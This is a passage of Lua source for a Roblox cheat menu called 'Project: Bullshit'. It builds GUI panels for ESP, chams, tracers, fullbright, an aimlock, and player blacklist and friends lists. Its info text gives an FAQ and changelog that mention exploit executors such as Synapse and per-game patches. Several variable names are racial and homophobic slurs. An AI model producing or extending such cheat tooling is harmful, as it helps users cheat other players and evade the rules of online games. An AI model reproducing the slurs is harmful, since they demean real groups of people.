				local SaveBlacklist = Instance.new("TextButton")
				local Whitelist = Instance.new("Frame")
				local nigga2 = Instance.new("TextLabel")
				local niggerfaggot2 = Instance.new("Frame")
				local players2 = Instance.new("ScrollingFrame")
				local buttonsex2 = Instance.new("Frame")
				local Playername2 = Instance.new("TextBox")
				local AddToWhitelist = Instance.new("TextButton")
				local RemoveToWhitelist = Instance.new("TextButton")
				local SaveWhitelist = Instance.new("TextButton")

				-- Properties

				Bullshit20.Name = "Bullshit 3.0"
				Bullshit20.Parent = CoreGui
				Bullshit20.ResetOnSpawn = false

				MainFrame.Name = "MainFrame"
				MainFrame.Parent = Bullshit20
				MainFrame.Active = true
				MainFrame.BackgroundColor3 = Color3.new(0.176471, 0.176471, 0.176471)
				MainFrame.BorderSizePixel = 0
				MainFrame.Draggable = true
				MainFrame.Position = UDim2.new(0.200000003, -175, 0.5, -100)
				MainFrame.Size = UDim2.new(0, 350, 0, 315)

				Title.Name = "Title"
				Title.Parent = MainFrame
				Title.BackgroundColor3 = Color3.new(1, 1, 1)
				Title.BackgroundTransparency = 1
				Title.Size = UDim2.new(1, 0, 0, 50)
				Title.Font = Enum.Font.SourceSansBold
				Title.Text = "Project: Bullshit\nMade by: Racist Dolphin#5199\nVersion 3.5.5 (RE-WORK IN THE WORKS)"
				Title.TextColor3 = Color3.new(1, 1, 1)
				Title.TextSize = 18
				Title.TextTransparency = 0.5

				design.Name = "design"
				design.Parent = MainFrame
				design.BackgroundColor3 = Color3.new(1, 1, 1)
				design.BackgroundTransparency = 0.5
				design.BorderSizePixel = 0
				design.Position = UDim2.new(0.0500000007, 0, 0, 50)
				design.Size = UDim2.new(0.899999976, 0, 0, 2)

				buttons.Name = "buttons"
				buttons.Parent = MainFrame
				buttons.BackgroundColor3 = Color3.new(1, 1, 1)
				buttons.BackgroundTransparency = 1
				buttons.Position = UDim2.new(0, 20, 0, 70)
				buttons.Size = UDim2.new(1, -40, 1, -80)

				Blacklist.Name = "Blacklist"
				Blacklist.Parent = MainFrame
				Blacklist.Active = true
				Blacklist.BackgroundColor3 = Color3.new(0.176471, 0.176471, 0.176471)
				Blacklist.BorderSizePixel = 0
				Blacklist.Position = UDim2.new(1, 3, 0.5, -138)
				Blacklist.Size = UDim2.new(0, 350, 0, 375)
				Blacklist.Visible = false

				nigga.Name = "nigga"
				nigga.Parent = Blacklist
				nigga.BackgroundColor3 = Color3.new(1, 1, 1)
				nigga.BackgroundTransparency = 1
				nigga.Size = UDim2.new(1, 0, 0, 50)
				nigga.Font = Enum.Font.SourceSansBold
				nigga.Text = "Blacklist Menu"
				nigga.TextColor3 = Color3.new(1, 1, 1)
				nigga.TextSize = 18
				nigga.TextTransparency = 0.5

				niggerfaggot.Name = "niggerfaggot"
				niggerfaggot.Parent = Blacklist
				niggerfaggot.BackgroundColor3 = Color3.new(1, 1, 1)
				niggerfaggot.BackgroundTransparency = 0.5
				niggerfaggot.BorderSizePixel = 0
				niggerfaggot.Position = UDim2.new(0.0500000007, 0, 0, 50)
				niggerfaggot.Size = UDim2.new(0.899999976, 0, 0, 2)

				players.Name = "players"
				players.Parent = Blacklist
				players.BackgroundColor3 = Color3.new(1, 1, 1)
				players.BackgroundTransparency = 1
				players.BorderSizePixel = 0
				players.Position = UDim2.new(0, 20, 0, 60)
				players.Size = UDim2.new(1, -40, 1, -175)
				players.CanvasSize = UDim2.new(0, 0, 5, 0)
				players.ScrollBarThickness = 8

				buttonsex.Name = "buttonsex"
				buttonsex.Parent = Blacklist
				buttonsex.BackgroundColor3 = Color3.new(1, 1, 1)
				buttonsex.BackgroundTransparency = 1
				buttonsex.Position = UDim2.new(0, 20, 0, 250)
				buttonsex.Size = UDim2.new(1, -40, 0, 100)

				Playername.Name = "Playername"
				Playername.Parent = buttonsex
				Playername.BackgroundColor3 = Color3.new(0.972549, 0.972549, 0.972549)
				Playername.BackgroundTransparency = 0.5
				Playername.BorderSizePixel = 0
				Playername.Size = UDim2.new(1, 0, 0, 20)
				Playername.Font = Enum.Font.SourceSansBold
				Playername.Text = "Enter Player Name"
				Playername.TextSize = 14
				Playername.TextWrapped = true

				AddToBlacklist.Name = "AddToBlacklist"
				AddToBlacklist.Parent = buttonsex
				AddToBlacklist.BackgroundColor3 = Color3.new(0.972549, 0.972549, 0.972549)
				AddToBlacklist.BackgroundTransparency = 0.5
				AddToBlacklist.BorderSizePixel = 0
				AddToBlacklist.Position = UDim2.new(0, 0, 0, 30)
				AddToBlacklist.Size = UDim2.new(1, 0, 0, 20)
				AddToBlacklist.Font = Enum.Font.SourceSansBold
				AddToBlacklist.Text = "Add to Blacklist"
				AddToBlacklist.TextSize = 14
				AddToBlacklist.TextWrapped = true

				RemoveToBlacklist.Name = "RemoveToBlacklist"
				RemoveToBlacklist.Parent = buttonsex
				RemoveToBlacklist.BackgroundColor3 = Color3.new(0.972549, 0.972549, 0.972549)
				RemoveToBlacklist.BackgroundTransparency = 0.5
				RemoveToBlacklist.BorderSizePixel = 0
				RemoveToBlacklist.Position = UDim2.new(0, 0, 0, 60)
				RemoveToBlacklist.Size = UDim2.new(1, 0, 0, 20)
				RemoveToBlacklist.Font = Enum.Font.SourceSansBold
				RemoveToBlacklist.Text = "Remove from Blacklist"
				RemoveToBlacklist.TextSize = 14
				RemoveToBlacklist.TextWrapped = true

				SaveBlacklist.Name = "SaveBlacklist"
				SaveBlacklist.Parent = buttonsex
				SaveBlacklist.BackgroundColor3 = Color3.new(0.972549, 0.972549, 0.972549)
				SaveBlacklist.BackgroundTransparency = 0.5
				SaveBlacklist.BorderSizePixel = 0
				SaveBlacklist.Position = UDim2.new(0, 0, 0, 90)
				SaveBlacklist.Size = UDim2.new(1, 0, 0, 20)
				SaveBlacklist.Font = Enum.Font.SourceSansBold
				SaveBlacklist.Text = "Save Blacklist"
				SaveBlacklist.TextSize = 14
				SaveBlacklist.TextWrapped = true

				Whitelist.Name = "Whitelist"
				Whitelist.Parent = MainFrame
				Whitelist.Active = true
				Whitelist.BackgroundColor3 = Color3.new(0.176471, 0.176471, 0.176471)
				Whitelist.BorderSizePixel = 0
				Whitelist.Position = UDim2.new(1, 3, 0.5, -138)
				Whitelist.Size = UDim2.new(0, 350, 0, 375)
				Whitelist.Visible = false

				nigga2.Name = "nigga2"
				nigga2.Parent = Whitelist
				nigga2.BackgroundColor3 = Color3.new(1, 1, 1)
				nigga2.BackgroundTransparency = 1
				nigga2.Size = UDim2.new(1, 0, 0, 50)
				nigga2.Font = Enum.Font.SourceSansBold
				nigga2.Text = "Friends List Menu"
				nigga2.TextColor3 = Color3.new(1, 1, 1)
				nigga2.TextSize = 18
				nigga2.TextTransparency = 0.5

				niggerfaggot2.Name = "niggerfaggot2"
				niggerfaggot2.Parent = Whitelist
				niggerfaggot2.BackgroundColor3 = Color3.new(1, 1, 1)
				niggerfaggot2.BackgroundTransparency = 0.5
				niggerfaggot2.BorderSizePixel = 0
				niggerfaggot2.Position = UDim2.new(0.0500000007, 0, 0, 50)
				niggerfaggot2.Size = UDim2.new(0.899999976, 0, 0, 2)

				players2.Name = "players2"
				players2.Parent = Whitelist
				players2.BackgroundColor3 = Color3.new(1, 1, 1)
				players2.BackgroundTransparency = 1
				players2.BorderSizePixel = 0
				players2.Position = UDim2.new(0, 20, 0, 60)
				players2.Size = UDim2.new(1, -40, 1, -175)
				players2.CanvasSize = UDim2.new(0, 0, 5, 0)
				players2.ScrollBarThickness = 8

				buttonsex2.Name = "buttonsex2"
				buttonsex2.Parent = Whitelist
				buttonsex2.BackgroundColor3 = Color3.new(1, 1, 1)
				buttonsex2.BackgroundTransparency = 1
				buttonsex2.Position = UDim2.new(0, 20, 0, 250)
				buttonsex2.Size = UDim2.new(1, -40, 0, 100)

				Playername2.Name = "Playername2"
				Playername2.Parent = buttonsex2
				Playername2.BackgroundColor3 = Color3.new(0.972549, 0.972549, 0.972549)
				Playername2.BackgroundTransparency = 0.5
				Playername2.BorderSizePixel = 0
				Playername2.Size = UDim2.new(1, 0, 0, 20)
				Playername2.Font = Enum.Font.SourceSansBold
				Playername2.Text = "Enter Player Name"
				Playername2.TextSize = 14
				Playername2.TextWrapped = true

				AddToWhitelist.Name = "AddToWhitelist"
				AddToWhitelist.Parent = buttonsex2
				AddToWhitelist.BackgroundColor3 = Color3.new(0.972549, 0.972549, 0.972549)
				AddToWhitelist.BackgroundTransparency = 0.5
				AddToWhitelist.BorderSizePixel = 0
				AddToWhitelist.Position = UDim2.new(0, 0, 0, 30)
				AddToWhitelist.Size = UDim2.new(1, 0, 0, 20)
				AddToWhitelist.Font = Enum.Font.SourceSansBold
				AddToWhitelist.Text = "Add to Friends List"
				AddToWhitelist.TextSize = 14
				AddToWhitelist.TextWrapped = true

				RemoveToWhitelist.Name = "RemoveToWhitelist"
				RemoveToWhitelist.Parent = buttonsex2
				RemoveToWhitelist.BackgroundColor3 = Color3.new(0.972549, 0.972549, 0.972549)
				RemoveToWhitelist.BackgroundTransparency = 0.5
				RemoveToWhitelist.BorderSizePixel = 0
				RemoveToWhitelist.Position = UDim2.new(0, 0, 0, 60)
				RemoveToWhitelist.Size = UDim2.new(1, 0, 0, 20)
				RemoveToWhitelist.Font = Enum.Font.SourceSansBold
				RemoveToWhitelist.Text = "Remove from Friends List"
				RemoveToWhitelist.TextSize = 14
				RemoveToWhitelist.TextWrapped = true

				SaveWhitelist.Name = "SaveWhitelist"
				SaveWhitelist.Parent = buttonsex2
				SaveWhitelist.BackgroundColor3 = Color3.new(0.972549, 0.972549, 0.972549)
				SaveWhitelist.BackgroundTransparency = 0.5
				SaveWhitelist.BorderSizePixel = 0
				SaveWhitelist.Position = UDim2.new(0, 0, 0, 90)
				SaveWhitelist.Size = UDim2.new(1, 0, 0, 20)
				SaveWhitelist.Font = Enum.Font.SourceSansBold
				SaveWhitelist.Text = "Save Friends List"
				SaveWhitelist.TextSize = 14
				SaveWhitelist.TextWrapped = true

				BlacklistToggle.Name = "BlacklistToggle"
				BlacklistToggle.Parent = buttons
				BlacklistToggle.BackgroundColor3 = Color3.new(1, 1, 1)
				BlacklistToggle.BackgroundTransparency = 0.5
				BlacklistToggle.BorderSizePixel = 0
				BlacklistToggle.Position = UDim2.new(0, 0, 0, 200)
				BlacklistToggle.Size = UDim2.new(0, 150, 0, 30)
				BlacklistToggle.Font = Enum.Font.SourceSansBold
				BlacklistToggle.Text = "Blacklist"
				BlacklistToggle.TextColor3 = Color3.new(0.176471, 0.176471, 0.176471)
				BlacklistToggle.TextSize = 14
				BlacklistToggle.TextWrapped = true

				WhitelistToggle.Name = "WhitelistToggle"
				WhitelistToggle.Parent = buttons
				WhitelistToggle.BackgroundColor3 = Color3.new(1, 1, 1)
				WhitelistToggle.BackgroundTransparency = 0.5
				WhitelistToggle.BorderSizePixel = 0
				WhitelistToggle.Position = UDim2.new(1, -150, 0, 200)
				WhitelistToggle.Size = UDim2.new(0, 150, 0, 30)
				WhitelistToggle.Font = Enum.Font.SourceSansBold
				WhitelistToggle.Text = "Friends List"
				WhitelistToggle.TextColor3 = Color3.new(0.176471, 0.176471, 0.176471)
				WhitelistToggle.TextSize = 14
				WhitelistToggle.TextWrapped = true

				ESPToggle.Name = "ESPToggle"
				ESPToggle.Parent = buttons
				ESPToggle.BackgroundColor3 = Color3.new(1, 1, 1)
				ESPToggle.BackgroundTransparency = 0.5
				ESPToggle.BorderSizePixel = 0
				ESPToggle.Size = UDim2.new(0, 150, 0, 30)
				ESPToggle.Font = Enum.Font.SourceSansBold
				ESPToggle.Text = "ESP"
				ESPToggle.TextColor3 = Color3.new(0.176471, 0.176471, 0.176471)
				ESPToggle.TextSize = 14
				ESPToggle.TextWrapped = true

				ChamsToggle.Name = "ChamsToggle"
				ChamsToggle.Parent = buttons
				ChamsToggle.BackgroundColor3 = Color3.new(1, 1, 1)
				ChamsToggle.BackgroundTransparency = 0.5
				ChamsToggle.BorderSizePixel = 0
				ChamsToggle.Position = UDim2.new(1, -150, 0, 0)
				ChamsToggle.Size = UDim2.new(0, 150, 0, 30)
				ChamsToggle.Font = Enum.Font.SourceSansBold
				ChamsToggle.Text = "Chams"
				ChamsToggle.TextColor3 = Color3.new(0.176471, 0.176471, 0.176471)
				ChamsToggle.TextSize = 14
				ChamsToggle.TextWrapped = true

				TracersToggle.Name = "TracersToggle"
				TracersToggle.Parent = buttons
				TracersToggle.BackgroundColor3 = Color3.new(1, 1, 1)
				TracersToggle.BackgroundTransparency = 0.5
				TracersToggle.BorderSizePixel = 0
				TracersToggle.Position = UDim2.new(0, 0, 0, 40)
				TracersToggle.Size = UDim2.new(0, 150, 0, 30)
				TracersToggle.Font = Enum.Font.SourceSansBold
				TracersToggle.Text = "Tracers"
				TracersToggle.TextColor3 = Color3.new(0.176471, 0.176471, 0.176471)
				TracersToggle.TextSize = 14
				TracersToggle.TextWrapped = true

				OutlineToggle.Name = "OutlineToggle"
				OutlineToggle.Parent = buttons
				OutlineToggle.BackgroundColor3 = Color3.new(1, 1, 1)
				OutlineToggle.BackgroundTransparency = 0.5
				OutlineToggle.BorderSizePixel = 0
				OutlineToggle.Position = UDim2.new(1, -150, 0, 40)
				OutlineToggle.Size = UDim2.new(0, 150, 0, 30)
				OutlineToggle.Font = Enum.Font.SourceSansBold
				OutlineToggle.Text = "Outlines"
				OutlineToggle.TextColor3 = Color3.new(0.176471, 0.176471, 0.176471)
				OutlineToggle.TextSize = 14
				OutlineToggle.TextWrapped = true

				DebugToggle.Name = "DebugToggle"
				DebugToggle.Parent = buttons
				DebugToggle.BackgroundColor3 = Color3.new(1, 1, 1)
				DebugToggle.BackgroundTransparency = 0.5
				DebugToggle.BorderSizePixel = 0
				DebugToggle.Position = UDim2.new(1, -150, 0, 80)
				DebugToggle.Size = UDim2.new(0, 150, 0, 30)
				DebugToggle.Font = Enum.Font.SourceSansBold
				DebugToggle.Text = "Debug Info"
				DebugToggle.TextColor3 = Color3.new(0.176471, 0.176471, 0.176471)
				DebugToggle.TextSize = 14
				DebugToggle.TextWrapped = true

				FullbrightToggle.Name = "FullbrightToggle"
				FullbrightToggle.Parent = buttons
				FullbrightToggle.BackgroundColor3 = Color3.new(1, 1, 1)
				FullbrightToggle.BackgroundTransparency = 0.5
				FullbrightToggle.BorderSizePixel = 0
				FullbrightToggle.Position = UDim2.new(0, 0, 0, 80)
				FullbrightToggle.Size = UDim2.new(0, 150, 0, 30)
				FullbrightToggle.Font = Enum.Font.SourceSansBold
				FullbrightToggle.Text = "Fullbright"
				FullbrightToggle.TextColor3 = Color3.new(0.176471, 0.176471, 0.176471)
				FullbrightToggle.TextSize = 14
				FullbrightToggle.TextWrapped = true

				Crosshair.Name = "Crosshair"
				Crosshair.Parent = buttons
				Crosshair.BackgroundColor3 = Color3.new(1, 1, 1)
				Crosshair.BackgroundTransparency = 0.5
				Crosshair.BorderSizePixel = 0
				Crosshair.Position = UDim2.new(0, 0, 0, 120)
				Crosshair.Size = UDim2.new(0, 150, 0, 30)
				Crosshair.Font = Enum.Font.SourceSansBold
				Crosshair.Text = "Crosshair"
				Crosshair.TextColor3 = Color3.new(0.176471, 0.176471, 0.176471)
				Crosshair.TextSize = 14
				Crosshair.TextWrapped = true

				AimbotToggle.Name = "AimbotToggle"
				AimbotToggle.Parent = buttons
				AimbotToggle.BackgroundColor3 = Color3.new(1, 1, 1)
				AimbotToggle.BackgroundTransparency = 0.5
				AimbotToggle.BorderSizePixel = 0
				AimbotToggle.Position = UDim2.new(1, -150, 0, 120)
				AimbotToggle.Size = UDim2.new(0, 150, 0, 30)
				AimbotToggle.Font = Enum.Font.SourceSansBold
				AimbotToggle.Text = "Aimlock"
				AimbotToggle.TextColor3 = Color3.new(0.176471, 0.176471, 0.176471)
				AimbotToggle.TextSize = 14
				AimbotToggle.TextWrapped = true

				Settings.Name = "Settings"
				Settings.Parent = buttons
				Settings.BackgroundColor3 = Color3.new(1, 1, 1)
				Settings.BackgroundTransparency = 0.5
				Settings.BorderSizePixel = 0
				Settings.Position = UDim2.new(1, -150, 0, 160)
				Settings.Size = UDim2.new(0, 150, 0, 30)
				Settings.Font = Enum.Font.SourceSansBold
				Settings.Text = "Settings"
				Settings.TextColor3 = Color3.new(0.176471, 0.176471, 0.176471)
				Settings.TextSize = 14
				Settings.TextWrapped = true

				Information.Name = "Information"
				Information.Parent = buttons
				Information.BackgroundColor3 = Color3.new(1, 1, 1)
				Information.BackgroundTransparency = 0.5
				Information.BorderSizePixel = 0
				Information.Position = UDim2.new(0, 0, 0, 160)
				Information.Size = UDim2.new(0, 150, 0, 30)
				Information.Font = Enum.Font.SourceSansBold
				Information.Text = "Information"
				Information.TextColor3 = Color3.new(0.176471, 0.176471, 0.176471)
				Information.TextSize = 14
				Information.TextWrapped = true

				Information_2.Name = "Information"
				Information_2.Parent = MainFrame
				Information_2.Active = true
				Information_2.BackgroundColor3 = Color3.new(0.176471, 0.176471, 0.176471)
				Information_2.BorderSizePixel = 0
				Information_2.Position = UDim2.new(1, 3, 0.5, -138)
				Information_2.Size = UDim2.new(0, 350, 0, 365)
				Information_2.Visible = false

				Title_2.Name = "Title"
				Title_2.Parent = Information_2
				Title_2.BackgroundColor3 = Color3.new(1, 1, 1)
				Title_2.BackgroundTransparency = 1
				Title_2.Size = UDim2.new(1, 0, 0, 50)
				Title_2.Font = Enum.Font.SourceSansBold
				Title_2.Text = "Information"
				Title_2.TextColor3 = Color3.new(1, 1, 1)
				Title_2.TextSize = 18
				Title_2.TextTransparency = 0.5

				design_2.Name = "design"
				design_2.Parent = Information_2
				design_2.BackgroundColor3 = Color3.new(1, 1, 1)
				design_2.BackgroundTransparency = 0.5
				design_2.BorderSizePixel = 0
				design_2.Position = UDim2.new(0.0500000007, 0, 0, 50)
				design_2.Size = UDim2.new(0.899999976, 0, 0, 2)

				buttons_2.Name = "buttons"
				buttons_2.Parent = Information_2
				buttons_2.BackgroundColor3 = Color3.new(1, 1, 1)
				buttons_2.BackgroundTransparency = 1
				buttons_2.BorderSizePixel = 0
				buttons_2.Position = UDim2.new(0, 20, 0, 60)
				buttons_2.Size = UDim2.new(1, -40, 1, -70)
				buttons_2.CanvasSize = UDim2.new(5, 0, 5, 0)
				buttons_2.ScrollBarThickness = 5

				TextLabel.Parent = buttons_2
				TextLabel.BackgroundColor3 = Color3.new(1, 1, 1)
				TextLabel.BackgroundTransparency = 1
				TextLabel.Size = UDim2.new(1, -20, 1, 0)
				TextLabel.Font = Enum.Font.SourceSansBold
				TextLabel.Text = [[
Scripting by: Racist Dolphin#5199
GUI by: SOMEONE WHO WANTS HIS NAME HIDDEN.

To hide/show the GUI press the "P" key on your keyboard.

NOTICE: Since my string manipulation skills aren't the greatest, changing esp/cham colors might be quite buggy.
NOTICE #2: The blacklist feature will return! I just didn't have enough time to make the gui.
NOTICE #3: Save Settings might still be bugged. Message me if it's fucked up still.

This works on every game, though the Aimbot does NOT! (Doesn't work on: Jailbreak, and Phantom Forces)

FAQ:
1) How do I use the aimbot?
A: Activate it, and hold right-click in-game. The aimbot will lock on to the closest enemy NOT behind a wall. (If said player is behind a wall, it will find the next closest player not behind a wall.)

2) ESP/Chams don't work on the game I play?
A: Some games require me to make patches (ex: Murder Mystery, Murder Mystery X) to request a patch or a game message me on discord.

3) How did I detect when a player is behind a wall?
A: Raycasting the camera to another player.

4) My bullets still miss when using aimbot?!
A: Blame bullet spread, try and control how often you fire. (Murder Mystery 2 = trash) (Why the fuck does a single shot pistol have bullet spread? lol wtf?)

Change Log:
3/10/2018:
+ Fixed more bugs with chams

3/10/2018:
+ Fixed how chams broke when a player respawned.

3/10/2018:
+ Fixed ESP not updating correctly.
+ Fixed Chams not updating correctly. (MAYBE? IDK WHAT IS BREAKING THIS)

3/9/2018:
+ Mob ESP/Chams! (BETA!)

3/8/2018:
+ Fixed the error you get when not entering a valid number for esp/chams/tracer lengths.
+ Fixed lag issues with aimlock.
+ Fixed lag issues with chams.

3/8/2018:
+ Patch for Murder 15
- Temporarily removed auto fire since mouse1click is broken on Synapse :(

3/7/2018:
+ Updated save settings.
+ Can now customize aimlock key.

3/7/2018:
+ Patch for Wild Revolver.
+ Fix for autofire. (Hopefully)

3/6/2018:
- Removed :IsFriendsWith check. (Use Friends List GUI instead)

3/4/2018:
+ Added Friend List Menu
+ Patch for Assassin!

3/4/2018:
+ Fixed crosshair toggle.
+ Aimlock patch for Island Royal.
+ Finally fixed save settings.

3/4/2018:
+ Aimlock fixed for Unit 1968: Vietnam
+ Autofire setting for aimlock
+ Fixed how you sometimes had to double click buttons to activate a option

3/4/2018:
+ Fixed FreeForAll setting bug.
+ Using aimlock on Phantom Forces / Jailbreak will now tell you it will not work.
* Renamed Aimbot back to Aimlock

3/3/2018:
+ Blacklist feature re-added.
+ Aimbot will no longer focus people in the blacklist.
+ Compatible on exploits that have readfile and writefile.

3/3/2018:
+ GUI Overhaul
+ Aimbot now only targets people NOT behind walls
+ Chams now dim when x player is visible on your screen.
+ Chams no longer have the humanoid root part. (Your welcome)
+ Patch for Silent Assassin
+ My discord was deleted, so I'm using pastebin now. (Auto updates :)
]]
				TextLabel.TextColor3 = Color3.new(1, 1, 1)
				TextLabel.TextSize = 16
				TextLabel.TextTransparency = 0.5
				TextLabel.TextXAlignment = Enum.TextXAlignment.Left
				TextLabel.TextYAlignment = Enum.TextYAlignment.Top

				Settings_2.Name = "Settings"
				Settings_2.Parent = MainFrame
				Settings_2.Active = true
				Settings_2.BackgroundColor3 = Color3.new(0.176471, 0.176471, 0.176471)
				Settings_2.BorderSizePixel = 0
				Settings_2.Position = UDim2.new(1, 3, 0.5, -138)
				Settings_2.Size = UDim2.new(0, 350, 0, 365)
				Settings_2.Visible = false

				Title_3.Name = "Title"
				Title_3.Parent = Settings_2
				Title_3.BackgroundColor3 = Color3.new(1, 1, 1)
				Title_3.BackgroundTransparency = 1
				Title_3.Size = UDim2.new(1, 0, 0, 50)
				Title_3.Font = Enum.Font.SourceSansBold
				Title_3.Text = "Settings Menu"
				Title_3.TextColor3 = Color3.new(1, 1, 1)
				Title_3.TextSize = 18
				Title_3.TextTransparency = 0.5

				design_3.Name = "design"
				design_3.Parent = Settings_2
				design_3.BackgroundColor3 = Color3.new(1, 1, 1)
				design_3.BackgroundTransparency = 0.5
				design_3.BorderSizePixel = 0
				design_3.Position = UDim2.new(0.0500000007, 0, 0, 50)
				design_3.Size = UDim2.new(0.899999976, 0, 0, 2)

				buttons_3.Name = "buttons"
				buttons_3.Parent = Settings_2
				buttons_3.BackgroundColor3 = Color3.new(1, 1, 1)
				buttons_3.BackgroundTransparency = 1
				buttons_3.BorderSizePixel = 0
				buttons_3.Position = UDim2.new(0, 20, 0, 60)
				buttons_3.Size = UDim2.new(1, -40, 1, -70)
				buttons_3.ScrollBarThickness = 8

				AllyColor.Name = "AllyColor"
				AllyColor.Parent = buttons_3
				AllyColor.BackgroundColor3 = Color3.new(0.972549, 0.972549, 0.972549)
				AllyColor.BackgroundTransparency = 0.5
				AllyColor.BorderSizePixel = 0
				AllyColor.Position = UDim2.new(1, -150, 0, 180)
				AllyColor.Size = UDim2.new(0, 135, 0, 20)
				AllyColor.Font = Enum.Font.SourceSansBold
				AllyColor.Text = tostring(Bullshit.Colors.Ally)
				AllyColor.TextSize = 14
				AllyColor.TextWrapped = true

				CHAMSLength.Name = "CHAMSLength"
				CHAMSLength.Parent = buttons_3
				CHAMSLength.BackgroundColor3 = Color3.new(0.972549, 0.972549, 0.972549)
				CHAMSLength.BackgroundTransparency = 0.5
				CHAMSLength.BorderSizePixel = 0
				CHAMSLength.Position = UDim2.new(1, -150, 0, 60)
				CHAMSLength.Size = UDim2.new(0, 135, 0, 20)
				CHAMSLength.Font = Enum.Font.SourceSansBold
				CHAMSLength.Text = tostring(Bullshit.CHAMSLength)
				CHAMSLength.TextSize = 14
				CHAMSLength.TextWrapped = true

				CrosshairColor.Name = "CrosshairColor"
				CrosshairColor.Parent = buttons_3
				CrosshairColor.BackgroundColor3 = Color3.new(0.972549, 0.972549, 0.972549)
				CrosshairColor.BackgroundTransparency = 0.5
				CrosshairColor.BorderSizePixel = 0
				CrosshairColor.Position = UDim2.new(1, -150, 0, 270)
				CrosshairColor.Size = UDim2.new(0, 135, 0, 20)
				CrosshairColor.Font = Enum.Font.SourceSansBold
				CrosshairColor.Text = tostring(Bullshit.Colors.Crosshair)
				CrosshairColor.TextSize = 14
				CrosshairColor.TextWrapped = true

				ESPLength.Name = "ESPLength"
				ESPLength.Parent = buttons_3
				ESPLength.BackgroundColor3 = Color3.new(0.972549, 0.972549, 0.972549)
				ESPLength.BackgroundTransparency = 0.5
				ESPLength.BorderSizePixel = 0
				ESPLength.Position = UDim2.new(1, -150, 0, 30)
				ESPLength.Size = UDim2.new(0, 135, 0, 20)
				ESPLength.Font = Enum.Font.SourceSansBold
				ESPLength.Text = tostring(Bullshit.ESPLength)
				ESPLength.TextSize = 14
				ESPLength.TextWrapped = true

				EnemyColor.Name = "EnemyColor"
				EnemyColor.Parent = buttons_3
				EnemyColor.BackgroundColor3 = Color3.new(0.972549, 0.972549, 0.972549)
				EnemyColor.BackgroundTransparency = 0.5
				EnemyColor.BorderSizePixel = 0
				EnemyColor.Position = UDim2.new(1, -150, 0, 150)
				EnemyColor.Size = UDim2.new(0, 135, 0, 20)
				EnemyColor.Font = Enum.Font.SourceSansBold
				EnemyColor.Text = tostring(Bullshit.Colors.Enemy)
				EnemyColor.TextSize = 14
				EnemyColor.TextWrapped = true

				FreeForAll.Name = "FreeForAll"
				FreeForAll.Parent = buttons_3
				FreeForAll.BackgroundColor3 = Color3.new(0.972549, 0.972549, 0.972549)
				FreeForAll.BackgroundTransparency = 0.5
				FreeForAll.BorderSizePixel = 0
				FreeForAll.Position = UDim2.new(1, -150, 0, 120)
				FreeForAll.Size = UDim2.new(0, 135, 0, 20)
				FreeForAll.Font = Enum.Font.SourceSansBold
				FreeForAll.Text = tostring(Bullshit.FreeForAll)
				FreeForAll.TextSize = 14
				FreeForAll.TextWrapped = true

				FriendColor.Name = "FriendColor"
				FriendColor.Parent = buttons_3
				FriendColor.BackgroundColor3 = Color3.new(0.972549, 0.972549, 0.972549)
				FriendColor.BackgroundTransparency = 0.5
				FriendColor.BorderSizePixel = 0
				FriendColor.Position = UDim2.new(1, -150, 0, 210)
				FriendColor.Size = UDim2.new(0, 135, 0, 20)
				FriendColor.Font = Enum.Font.SourceSansBold
				FriendColor.Text = tostring(Bullshit.Colors.Friend)
				FriendColor.TextSize = 14
				FriendColor.TextWrapped = true

				NeutralColor.Name = "NeutralColor"
				NeutralColor.Parent = buttons_3
				NeutralColor.BackgroundColor3 = Color3.new(0.972549, 0.972549, 0.972549)
				NeutralColor.BackgroundTransparency = 0.5
				NeutralColor.BorderSizePixel = 0
				NeutralColor.Position = UDim2.new(1, -150, 0, 240)
				NeutralColor.Size = UDim2.new(0, 135, 0, 20)
				NeutralColor.Font = Enum.Font.SourceSansBold
				NeutralColor.Text = tostring(Bullshit.Colors.Neutral)
				NeutralColor.TextSize = 14
				NeutralColor.TextWrapped = true

				TracersLength.Name = "TracersLength"
				TracersLength.Parent = buttons_3
				TracersLength.BackgroundColor3 = Color3.new(0.972549, 0.972549, 0.972549)
				TracersLength.BackgroundTransparency = 0.5
				TracersLength.BorderSizePixel = 0
				TracersLength.Position = UDim2.new(1, -150, 0, 0)
				TracersLength.Size = UDim2.new(0, 135, 0, 20)
				TracersLength.Font = Enum.Font.SourceSansBold
				TracersLength.Text = tostring(Bullshit.TracersLength)
				TracersLength.TextSize = 14
				TracersLength.TextWrapped = true

				TracersUnderChars.Name = "TracersUnderChars"
				TracersUnderChars.Parent = buttons_3
				TracersUnderChars.BackgroundColor3 = Color3.new(0.972549, 0.972549, 0.972549)
				TracersUnderChars.BackgroundTransparency = 0.5
				TracersUnderChars.BorderSizePixel = 0
				TracersUnderChars.Position = UDim2.new(1, -150, 0, 90)
				TracersUnderChars.Size = UDim2.new(0, 135, 0, 20)
				TracersUnderChars.Font = Enum.Font.SourceSansBold
				TracersUnderChars.Text = tostring(Bullshit.PlaceTracersUnderCharacter)
				TracersUnderChars.TextSize = 14
				TracersUnderChars.TextWrapped = true

				AutoFireToggle.Name = "AutoFireToggle"
				AutoFireToggle.Parent = buttons_3
				AutoFireToggle.BackgroundColor3 = Color3.new(0.972549, 0.972549, 0.972549)
				AutoFireToggle.BackgroundTransparency = 0.5
				AutoFireToggle.BorderSizePixel = 0
				AutoFireToggle.Position = UDim2.new(1, -150, 0, 300)
				AutoFireToggle.Size = UDim2.new(0, 135, 0, 20)
				AutoFireToggle.Font = Enum.Font.SourceSansBold
				AutoFireToggle.Text = tostring(Bullshit.AutoFire)
				AutoFireToggle.TextSize = 14
				AutoFireToggle.TextWrapped = true

				AimbotKey.Name = "AimbotKey"
				AimbotKey.Parent = buttons_3
				AimbotKey.BackgroundColor3 = Color3.new(0.972549, 0.972549, 0.972549)
				AimbotKey.BackgroundTransparency = 0.5
				AimbotKey.BorderSizePixel = 0
				AimbotKey.Position = UDim2.new(1, -150, 0, 330)
				AimbotKey.Size = UDim2.new(0, 135, 0, 20)
				AimbotKey.Font = Enum.Font.SourceSansBold
				AimbotKey.Text = tostring(Bullshit.AimbotKey)
				AimbotKey.TextSize = 14
				AimbotKey.TextWrapped = true

				MobESPButton.Name = "MobESPButton"
				MobESPButton.Parent = buttons_3
				MobESPButton.BackgroundColor3 = Color3.new(0.972549, 0.972549, 0.972549)
				MobESPButton.BackgroundTransparency = 0.5
				MobESPButton.BorderSizePixel = 0
				MobESPButton.Position = UDim2.new(1, -150, 0, 360)
				MobESPButton.Size = UDim2.new(0, 135, 0, 20)
				MobESPButton.Font = Enum.Font.SourceSansBold
